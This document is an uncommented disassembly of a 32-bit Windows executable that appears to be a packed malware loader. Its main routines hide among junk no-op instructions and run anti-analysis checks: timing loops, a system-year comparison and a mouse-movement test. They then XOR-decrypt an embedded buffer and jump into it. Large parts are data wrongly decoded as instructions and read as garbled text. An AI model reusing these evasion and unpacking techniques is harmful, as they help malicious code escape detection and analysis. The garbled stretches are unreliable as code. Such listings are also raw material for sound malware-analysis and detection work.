add [ eax + eax + 0x67a00047 ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x3ffb900 ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + eax + 0x64200047 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push j_sub_403970#4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46db6e
retn
mov eax [ rw-data ]
call sub_40599c
mov eax [ rw-data ]
call sub_40599c
sub_46db70
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_46dab0
call sub_403d40
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov edx eax
test edx edx
je r-xdata
mov eax [ rw-data ]
mov ecx r-xdata
call sub_4059e0
mov eax [ rw-data ]
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx r-xdata
call sub_4059e0
sub edx 0xfffffff8
sub_46dc18
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46dc3d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dc44
retn
sub_46dc50
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46dc75
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dc7c
retn
sub_46dc88
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46dcad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dcb4
retn
sub_46dcc0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46dce5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dcec
retn
sub_46dd2e
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebx * 8 - 0x2217ffba ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh cl
fld [ esi ]
push esp
add [ eax ] al
add [ ebp + ebp + 0x2ac0046 ] ah
inc edx
add [ eax + 0x34 ] dh
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah dl
fiadd [ esi ]
and al 0xa8
inc ecx
add [ esi + edi * 8 - 0x58bfffbf ] dh
inc ecx
add [ eax + 0x32 ] cl
inc esi
add [ eax - 0x2 ] bl
inc ecx
add [ edi + edi * 8 + 0x940041 ] bl
inc edx
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
cld
xor eax [ esi ]
pushfd
fiadd [ esi ]
adc al 0xde
inc esi
add [ eax + 0x32 ] dh
inc esi
add [ edx + esi + 0x46 ] ch
add [ eax ] ah
fiadd [ esi ]
mov dh bl
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bh
fadd [ esi ]
push eax
add [ eax ] al
add [ edx ] dl
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_4059e0
inc ecx
jo r-xdata
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
lea eax [ eax ]
call 0x74724c6
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
jne r-xdata
jo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46de73
lea eax [ ebp - 0x4 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
lea eax [ ebx + 0x50 ]
call sub_40599c
retn
inc ebp
cld
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
js r-xdata
adc dl [ ecx + eax * 2 + 0x63 ]
arpl [ ebp + 0x73 ] sp
jae r-xdata
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0xe800408d
fld [ esi ]
pop es
inc esi
add [ esi + ebp + 0x46 ] dl
add [ 0x63410800 ] al
arpl [ ebp + 0x73 ] sp
jae r-xdata
push eax
add [ eax ] al
lea eax [ eax ]
mov edx rw-data
mov [ eax + 0x30 ] edx
retn
sub_46de20
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46de6c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46de73
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
lea eax [ ebx + 0x50 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_4059e0
sub_46de77
add al al
out 0xcc al
push 0x101b6129
scasd [ edi ]
dec esi
add [ edx + 0x70f3f00 ] ch
push ebx
mov ebx eax
cmp [ ebx + 0x50 ] 0x0
je r-xdata
pop ebx
retn
lea eax [ ebx + 0x50 ]
call sub_40599c
sub_46de9c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4631a4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_46ded4
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4631f8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_46defc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46df21
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46df28
retn
sub_46df38
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
loope r-xdata
nop
inc ebp
add al bl
nop
add [ eax + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
inc esi
add [ ebx + eax ] bl
add [ eax ] al
mov al [ 0xffffffffac004560 ]
add al [ edx ]
ror [ ebp + eax * 2 + 0x458e7400 ] 0x0
js r-xdata
add al ah
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax + 0x3400446f ] bl
mov al [ ebp ]
inc eax
mov eax [ 0x452c0045 ]
inc esp
add [ esi + ebp * 4 ] al
inc ebp
add [ ecx + esi * 4 + 0x45 ] ah
add [ eax ] ah
mov al 0x45
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ edx + esi * 4 + 0x44280045 ] bl
inc esp
add al bl
jo r-xdata
add [ esp + edi * 2 ] cl
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ edi + edx * 4 ] bh
inc ebp
add [ esi + ebp * 2 + 0x44 ] ch
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
cwde
inc ebp
add [ ebx + ebp + 0x44 ] bl
add [ esi + eax + 0x44 ] dh
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ edx + ebx * 4 ] ah
inc ebp
add al dh
cwde
inc ebp
add [ eax ] bh
or [ eax + eax - 0x64 ] eax
0x2be00045 0x44
clc
add [ edi + edi * 8 - 0x2a03ffbf ] ah
inc ebp
add [ ebx + ecx * 4 ] dh
inc ebp
add al dh
jbe r-xdata
inc ebp
inc ebp
add ah ah
xchg ecx eax
inc ebp
add [ esi + eax + 0x2c40044 ] cl
inc edx
add [ edx + ebx * 4 + 0x45 ] bl
inc eax
add al ah
mov dl 0x45
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah bl
mov es [ ebp ]
fdivr [ ebx + 0x44 ]
add [ esp + edx * 4 + 0x45 ] cl
add [ eax - 0x59 ] al
inc ecx
add [ eax + edx * 4 - 0x6f27ffbb ] bl
add al [ eax ]
add [ eax ] al
add [ eax ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x31786f42
cld
add al [ eax ]
add [ ecx ] al
add [ esi ] al
push eax
popad
outsb
insb
xor [ eax ] eax
add eax [ eax ]
add [ edx ] al
add [ ebx ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x30431
add [ ebx ] al
add [ edi ] al
inc edx
jne r-xdata
add [ eax - 0x53ffba47 ] dl
add [ eax + eax + 0x1c ] 0x6d
inc esp
add [ esi + ecx * 8 - 0x7bd7ffbb ] ah
inc ebp
add al bl
xchg [ ebp ] al
test [ edi - 0x703fffbb ] bh
inc ebp
add [ eax + edx * 4 ] bh
inc ebp
add [ edx + edx * 8 - 0x7307ffbb ] al
inc ebp
add [ eax + 0x680045cd ] cl
mov ah 0x45
add [ edi + ecx * 8 ] bh
inc ebp
add [ eax ] ah
0x90045 0xe113
inc esi
add al bh
push cs
inc ebx
add [ ebx * 8 - 0x276fffba ] ch
inc edx
add [ edi ] dl
je r-xdata
nop
mov edi edi
mov edx edx
xor [ eax - 0x17ffb921 ] eax
inc ebx
add [ eax ] bh
outsb
xor [ eax ] ecx
add eax [ eax ]
add [ eax + eax ] al
pop es
push ebp
jo r-xdata
movss xmm2 xmm2
movss xmm2 xmm2
movss xmm5 xmm5
mov esi esi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call FoldStringA
mov ecx ecx
mov ebx ebx
mov edx edx
xchg edx edx
movss xmm6 xmm6
movss xmm5 xmm5
mov ebx ebx
movss xmm3 xmm3
dec ebx
jne r-xdata
movss xmm5 xmm5
movss xmm6 xmm6
mov ecx ecx
mov edx edx
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
je r-xdata
outsd
ja r-xdata
movss xmm6 xmm6
mov ecx ecx
xchg ecx ecx
movss xmm7 xmm7
push 0x0
push 0x0
call SetAbortProc
mov esi esi
movss xmm0 xmm0
movss xmm3 xmm3
movss xmm3 xmm3
call GetLastError
mov [ rw-data ] eax
movss xmm1 xmm1
movss xmm7 xmm7
mov ecx ecx
push rw-data
call GetLocalTime
mov ebx ebx
movss xmm3 xmm3
mov edx edx
xchg esi esi
cmp [ rw-data ] 0x7e0
jae r-xdata
movss xmm1 xmm1
mov edi edi
movss xmm7 xmm7
xchg ebx ebx
jmp r-xdata
movsb [ edi ] [ esi ]
jl r-xdata
arpl [ ebp + 0x78 ] dx
je r-xdata
inc edx
add [ edi + ebx * 2 + 0x43 ] cl
add [ ebp - 0x1ebfffc0 ] cl
inc esi
adc al 0xe7
xor [ ebx + eax ] ecx
add [ eax ] al
add eax 0x63411200
arpl [ ebp + 0x73 ] sp
jae r-xdata
movss xmm1 xmm1
movss xmm4 xmm4
mov esi esi
cmp [ rw-data ] 0x6
je r-xdata
movss xmm0 xmm0
movss xmm3 xmm3
mov edx edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e56b
retn
mov ebx 0x14b6
mov [ fs : eax ] edx
push sub_46e188
retn
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
loope r-xdata
push es
push esp
inc esi
outsd
jb r-xdata
or [ eax ] eax
jl r-xdata
jo r-xdata
mov ebx 0x1b2e
movss xmm3 xmm3
movss xmm5 xmm5
mov edx edx
xchg ecx ecx
jmp r-xdata
add [ edi ] al
push es
push esp
inc esi
add bl al
jmp sub_403970
xor [ ecx ] ecx
add [ ebx + edx * 2 + 0x43 ] bh
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
add [ ebx * 8 - 0x3c0bffbe ] bh
inc esp
add ah bh
dec eax
inc ebx
outsd
jb r-xdata
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
xor [ eax ] edx
add eax [ eax ]
add [ esi ] al
add [ esi ] al
inc edx
jbe r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call FoldStringA
dec ebx
jne r-xdata
xchg edx edx
xchg edx edx
mov eax eax
mov esi esi
movss xmm0 xmm0
movss xmm2 xmm2
mov ebx ebx
mov ecx ecx
mov esi esi
movss xmm2 xmm2
nop
movss xmm7 xmm7
mov ebx ebx
mov eax eax
mov edx edx
movss xmm6 xmm6
mov eax 0x1f773389
call sub_40278c
mov ecx eax
movss xmm1 xmm1
mov ebx ebx
movss xmm7 xmm7
test ecx ecx
je r-xdata
popad
inc ebp
add [ esi ] bl
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
insb
xor [ ebx + eax ] edx
add [ eax ] al
pop es
add [ ecx ] cl
push ebx
jo r-xdata
xchg ebx ebx
xchg ebx ebx
movss xmm7 xmm7
mov edx edx
mov ebx 0x1
rcl [ ebp + 0x68 ] 0x81
loope r-xdata
imul esi [ esp + esi * 2 + 0x65 ] 0x3183172
add [ eax ] al
or [ eax ] al
or edx [ ebx + 0x74 ]
popad
movss xmm6 xmm6
movss xmm5 xmm5
movss xmm1 xmm1
mov eax eax
lea eax [ ebx + 0x1 ]
mov edi 0x60
xor edx edx
div edi
mov eax ecx
add eax ebx
mov [ eax ] dl
movss xmm1 xmm1
movss xmm2 xmm2
movss xmm4 xmm4
mov edx edx
inc ebx
cmp ebx 0x1f772958
jne r-xdata
mov esi esi
mov ebx ebx
movss xmm2 xmm2
xchg esi esi
mov eax ecx
call sub_4027ac
mov ecx ecx
movss xmm3 xmm3
mov edx edx
nop
mov ebx 0x8cd9
jae r-xdata
add [ edi + edi * 8 + 0x30 ] ah
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call FoldStringA
dec ebx
jne r-xdata
xor ebx ebx
movss xmm0 xmm0
mov ecx ecx
xchg esi esi
mov eax eax
push rw-data
call GetCursorPos
xchg edi edi
movss xmm0 xmm0
movss xmm5 xmm5
mov ebx ebx
xchg edx edx
mov ecx ecx
mov esi esi
push 0x15
call sub_4064d8
movss xmm3 xmm3
movss xmm6 xmm6
mov esi esi
cmp ebx 0x7
jbe r-xdata
mov ebx ebx
mov esi esi
movss xmm3 xmm3
mov esi esi
inc ebx
mov edi edi
xchg esi esi
nop
movss xmm3 xmm3
mov eax [ esi ]
mov [ rw-data ] eax
movss xmm0 xmm0
mov esi esi
movss xmm5 xmm5
mov edx edx
movss xmm0 xmm0
movss xmm2 xmm2
movss xmm2 xmm2
mov edi edi
push esi
call GetCursorPos
mov eax eax
movss xmm6 xmm6
movss xmm4 xmm4
mov eax [ esi ]
sub eax [ rw-data ]
cmp eax 0x36
jbe r-xdata
mov edi edi
movss xmm0 xmm0
movss xmm3 xmm3
movss xmm0 xmm0
mov eax 0x7fd6
call sub_40278c
mov [ rw-data ] eax
mov ebx ebx
mov eax eax
mov ebx ebx
cmp [ rw-data ] 0x0
jne r-xdata
movss xmm7 xmm7
movss xmm6 xmm6
mov esi esi
xchg ecx ecx
mov edx rw-data
mov ecx 0x5b79
mov eax [ rw-data ]
call sub_406c7c
mov esi esi
mov ebx ebx
xchg ebx ebx
movss xmm5 xmm5
xor ebx ebx
mov eax eax
movss xmm6 xmm6
movss xmm6 xmm6
jmp r-xdata
mov eax [ rw-data ]
add eax ebx
mov dl [ rw-data ]
xor [ eax ] dl
inc ebx
cmp ebx 0x5b7a
jne r-xdata
movss xmm7 xmm7
mov esi esi
mov ebx ebx
movss xmm6 xmm6
mov eax eax
movss xmm4 xmm4
mov ebx ebx
mov eax eax
movss xmm6 xmm6
xor edi edi
movss xmm0 xmm0
movss xmm2 xmm2
movss xmm6 xmm6
add edi [ rw-data ]
mov ebx ebx
movss xmm3 xmm3
movss xmm4 xmm4
xchg ebx edi
movss xmm0 xmm0
movss xmm6 xmm6
mov eax eax
xchg esi esi
add ebx 0x1249
movss xmm3 xmm3
mov ecx ecx
mov edi edi
movss xmm7 xmm7
push ebx
movss xmm1 xmm1
movss xmm3 xmm3
movss xmm3 xmm3
mov ecx ecx
retn
sub_46e18c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi rw-data
xor eax eax
push ebp
push j_sub_403970#2
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e56b
retn
mov ebx ebx
nop
mov edi edi
mov edx edx
mov ebx 0x14b6
movss xmm2 xmm2
movss xmm2 xmm2
movss xmm5 xmm5
mov esi esi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call FoldStringA
mov ecx ecx
mov ebx ebx
mov edx edx
xchg edx edx
movss xmm6 xmm6
movss xmm5 xmm5
mov ebx ebx
movss xmm3 xmm3
dec ebx
jne r-xdata
movss xmm5 xmm5
movss xmm6 xmm6
mov ecx ecx
mov edx edx
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
movss xmm6 xmm6
mov ecx ecx
xchg ecx ecx
movss xmm7 xmm7
push 0x0
push 0x0
call SetAbortProc
mov esi esi
movss xmm0 xmm0
movss xmm3 xmm3
movss xmm3 xmm3
call GetLastError
mov [ rw-data ] eax
movss xmm1 xmm1
movss xmm7 xmm7
mov ecx ecx
push rw-data
call GetLocalTime
mov ebx ebx
movss xmm3 xmm3
mov edx edx
xchg esi esi
cmp [ rw-data ] 0x7e0
jae r-xdata
movss xmm1 xmm1
mov edi edi
movss xmm7 xmm7
xchg ebx ebx
jmp r-xdata
movss xmm1 xmm1
movss xmm4 xmm4
mov esi esi
cmp [ rw-data ] 0x6
je r-xdata
movss xmm0 xmm0
movss xmm3 xmm3
mov edx edx
jmp r-xdata
mov ebx 0x1b2e
movss xmm3 xmm3
movss xmm5 xmm5
mov edx edx
xchg ecx ecx
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call FoldStringA
dec ebx
jne r-xdata
xchg edx edx
xchg edx edx
mov eax eax
mov esi esi
movss xmm0 xmm0
movss xmm2 xmm2
mov ebx ebx
mov ecx ecx
mov esi esi
movss xmm2 xmm2
nop
movss xmm7 xmm7
mov ebx ebx
mov eax eax
mov edx edx
movss xmm6 xmm6
mov eax 0x1f773389
call sub_40278c
mov ecx eax
movss xmm1 xmm1
mov ebx ebx
movss xmm7 xmm7
test ecx ecx
je r-xdata
xchg ebx ebx
xchg ebx ebx
movss xmm7 xmm7
mov edx edx
mov ebx 0x1
movss xmm6 xmm6
movss xmm5 xmm5
movss xmm1 xmm1
mov eax eax
lea eax [ ebx + 0x1 ]
mov edi 0x60
xor edx edx
div edi
mov eax ecx
add eax ebx
mov [ eax ] dl
movss xmm1 xmm1
movss xmm2 xmm2
movss xmm4 xmm4
mov edx edx
inc ebx
cmp ebx 0x1f772958
jne r-xdata
mov esi esi
mov ebx ebx
movss xmm2 xmm2
xchg esi esi
mov eax ecx
call sub_4027ac
mov ecx ecx
movss xmm3 xmm3
mov edx edx
nop
mov ebx 0x8cd9
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call FoldStringA
dec ebx
jne r-xdata
xor ebx ebx
movss xmm0 xmm0
mov ecx ecx
xchg esi esi
mov eax eax
push rw-data
call GetCursorPos
xchg edi edi
movss xmm0 xmm0
movss xmm5 xmm5
xchg edx edx
mov ecx ecx
mov esi esi
push 0x15
call sub_4064d8
movss xmm3 xmm3
movss xmm6 xmm6
mov esi esi
cmp ebx 0x7
jbe r-xdata
mov ebx ebx
mov esi esi
movss xmm3 xmm3
mov esi esi
inc ebx
mov edi edi
xchg esi esi
nop
movss xmm3 xmm3
mov eax [ esi ]
mov [ rw-data ] eax
movss xmm0 xmm0
mov esi esi
movss xmm5 xmm5
mov edx edx
movss xmm0 xmm0
movss xmm2 xmm2
movss xmm2 xmm2
mov edi edi
push esi
call GetCursorPos
mov eax eax
movss xmm6 xmm6
movss xmm4 xmm4
mov eax [ esi ]
sub eax [ rw-data ]
cmp eax 0x36
jbe r-xdata
mov edi edi
movss xmm0 xmm0
movss xmm3 xmm3
movss xmm0 xmm0
mov eax 0x7fd6
call sub_40278c
mov [ rw-data ] eax
mov ebx ebx
mov eax eax
mov ebx ebx
cmp [ rw-data ] 0x0
jne r-xdata
movss xmm7 xmm7
movss xmm6 xmm6
mov esi esi
xchg ecx ecx
mov edx rw-data
mov ecx 0x5b79
mov eax [ rw-data ]
call sub_406c7c
mov esi esi
mov ebx ebx
xchg ebx ebx
movss xmm5 xmm5
xor ebx ebx
mov eax eax
movss xmm6 xmm6
movss xmm6 xmm6
jmp r-xdata
mov eax [ rw-data ]
add eax ebx
mov dl [ rw-data ]
xor [ eax ] dl
inc ebx
cmp ebx 0x5b7a
jne r-xdata
movss xmm7 xmm7
mov esi esi
mov ebx ebx
movss xmm6 xmm6
mov eax eax
movss xmm4 xmm4
mov ebx ebx
mov eax eax
movss xmm6 xmm6
xor edi edi
movss xmm0 xmm0
movss xmm2 xmm2
movss xmm6 xmm6
add edi [ rw-data ]
mov ebx ebx
movss xmm3 xmm3
movss xmm4 xmm4
xchg ebx edi
movss xmm0 xmm0
movss xmm6 xmm6
mov eax eax
xchg esi esi
add ebx 0x1249
movss xmm3 xmm3
mov ecx ecx
mov edi edi
movss xmm7 xmm7
push ebx
movss xmm1 xmm1
movss xmm3 xmm3
movss xmm3 xmm3
mov ecx ecx
retn
sub_46e57d
add [ eax ] al
add [ esi + eax * 2 + 0x69 ] ch
push edi
xor esi [ edi + 0x7a ]
dec ecx
push 0x54
outsd
popad
push edx
xor [ edi + 0x78 ] edx
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403970
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e5ba
retn
sub_46e5bc
push esi
add [ eax ] al
add ah al
in eax 0x46
add [ ecx + 0x615c0040 ] cl
inc eax
add [ eax + 0x2c00405f ] al
pop edi
inc eax
add [ edx ] al
inc eax
add ah dl
popad
inc eax
add al dh
outsb
inc eax
add al al
outsb
inc eax
add [ eax ] ch
outsd
inc eax
add al bh
outsb
inc eax
add [ edi + esi * 2 ] dl
inc ecx
add ah ah
jbe r-xdata
xor al 0xa7
add [ eax + 0x72 ] dh
inc eax
add [ eax + 0x72 ] al
inc eax
add [ ecx + ebx * 8 + 0x40 ] cl
add ah cl
xlat
inc eax
add al ah
loope r-xdata
add [ eax + esi * 4 ] dl
inc edx
add ah al
test al 0x42
add [ eax + ebp * 4 + 0x11780042 ] dl
inc edx
add [ eax + 0x11 ] cl
inc edx
add [ eax - 0x5d ] al
inc edx
add [ edx + 0x42 ] ch
add [ eax + 0x600044ed ] dl
in eax dx
add [ eax + 0x200040e1 ] dh
pop edx
inc ecx
add [ eax - 0xbffbea7 ] ch
pop ebx
inc ecx
add ah al
pop ebx
inc ecx
add ah bl
jae r-xdata
inc esp
add [ eax + esi * 4 - 0x4fabffbe ] al
inc edx
add ah dh
push ebx
inc ebp
add [ ebx + edx * 2 - 0x3a43ffbb ] al
inc edx
add [ ebp + eax * 8 - 0x309bffbe ] cl
inc edx
add [ eax ] dl
iretd
insb
mov [ 0xffffffffed900042 ] al
inc esp
add [ eax - 0x13 ] ah
inc edx
add [ edi ] al
inc edx
add [ eax + eax * 8 + 0x42 ] bh
add [ eax + eax * 8 ] bh
inc edx
add [ eax + esi * 4 + 0x42 ] al
add [ ebx + esi * 2 + 0xe140041 ] cl
inc edx
add [ ebp + ecx + 0x42 ] ah
add [ esp + 0x42 ] bh
add [ esp + 0x42 ] cl
add [ edi ] dh
sub_46e6aa
inc edx
add [ eax ] al
rol [ edx ] 0x1
rcl al 0x1
inc edx
add [ edx + ecx ] ch
inc ebx
add ah bh
or [ ebx ] eax
mov eax 0x880043a3
mov [ 0xffffffffc0b40043 ] eax
inc edx
add [ eax + eax * 8 - 0x3f07ffbe ] al
inc edx
add [ eax + eax * 8 - 0x2ec7ffbe ] bh
inc edx
add [ eax ] cl
rol [ edx ] 0x1
jo r-xdata
add al dl
rol [ edx ] 0x1
sub al 0xa
inc edx
add [ eax - 0x2f ] al
inc edx
add [ eax + 0x4c0042d7 ] ch
xlat
inc edx
add ah bh
add eax 0x5b40043
inc ebx
add al ch
iretd
sub_46e765
rol [ eax + eax + 0x64 ] 0xc0
inc esp
add [ eax + 0x580044d6 ] cl
salc
inc esp
add ah ch
mov cl 0x43
add [ ecx + esi * 4 + 0x43 ] dh
add [ eax ] dl
les eax [ edx ]
loopne r-xdata
or [ ebx ] eax
movsb [ edi ] [ esi ]
or [ ebx ] eax
push es
inc ebx
add [ esi + eax ] dh
inc ebx
add [ edi + ebx ] ah
inc ebx
add [ esi + ebx + 0x2a180043 ] ch
inc ebx
add ah dl
sub [ ebx ] eax
int3
inc edx
add al ch
sbb [ esi ] al
mov [ eax ] ds
inc esi
add [ ecx + ebx + 0x19540046 ] al
inc esi
add ah ch
sub al [ esi ]
insb
sub al [ esi ]
pushfd
sub eax [ esi ]
insb
sub eax [ esi ]
je r-xdata
inc esi
add [ eax - 0x7e ] ch
inc esi
add [ eax ] bh
add [ esi ] 0x68
mov [ esi ] 0x2c
mov [ esi ] 0x10
add [ esi ] 0xe0
add [ esi ] sub_469068
sub al 0x90
inc esi
add [ eax + 0x70004681 ] ah
add [ esi ] sub_46cb2c
ror dl 0x1
inc esi
add al ch

inc esi
add [ esp + esi + 0x46 ] al
add al al
xor al 0x46
add [ eax + 0x68004634 ] dl
xor eax 0x35380046
inc esi
add al dh
fadd [ esi ]
rcr ah 0x46
add al ah
dec esp
inc esi
add [ eax + 0x1c00464c ] al
add [ esi ] sub_4680e0
sbb ah 0x46
add [ eax - 0x24 ] dl
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_46e5bc
call sub_406118
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46038c
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_4603a4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460424
call sub_403e7c
sub_4012ec
jmp [ __import_lookup_table_1(user32:CharNextA) ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_4012fc
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401314
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_401324
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40132c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401334
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40133c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_40135c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
sub_401374
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_40137c
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ __import_lookup_table_0(kernel32:WideCharToMultiByte) ]
sub_40139c
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
sub_4013b4
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
InterlockedDecrement
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_4013cc
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_4013dc
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401400
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401420
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401428
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401430
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401438
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401b82
jmp sub_403970
sub_401b89
mov al [ rw-data ]
pop ebp
retn
sub_401c66
jmp sub_403970
sub_401d34
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402348
retn
sub_402334
jmp sub_403970
sub_4024da
jmp sub_403970
sub_402779
jmp sub_403970
sub_40283c
call sub_4060cc
